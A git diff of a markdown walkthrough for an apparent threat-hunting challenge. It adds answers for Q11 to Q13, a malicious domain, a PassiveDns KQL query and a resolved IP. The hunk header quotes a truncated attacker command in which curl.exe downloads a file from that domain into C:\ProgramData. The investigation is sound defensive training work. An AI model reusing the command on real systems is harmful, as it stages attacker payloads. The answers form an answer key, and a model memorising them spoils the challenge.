@@ -116,15 +116,26 @@ curl.exe -o C:\ProgramData\Heartburn\mypasswordsnstuff.txt https://newdevelopmen
 **Answer: mypasswordsnstuff.txt**<br><br>
 
 **Q11. What is the name of that domain?**<br>
+From previous query.<br><br>
+
+**Answer: newdevelopmentupdates.org**<br><br>
+
+**Q12. What is the last IP address that the domain you found in Q11 resolve to?**<br>
+
+```
+PassiveDns
+| where domain == 'newdevelopmentupdates.org'
+```
+<br>
+
+**Answer: 239.72.6.37**<br><br>
+
+
+**Q13. Do the IPs found in Q11 resolve to other domains? If they do, answer with the domain. If not, type no.**<br>
 
 **Answer: **<br><br>
-**Q2. **<br>
 
-**Answer: **<br><br>
-**Q2. **<br>
-
-**Answer: **<br><br>
-**Q2. **<br>
+**Q14. **<br>
 
 **Answer: **<br><br>
 **Q2. **<br>
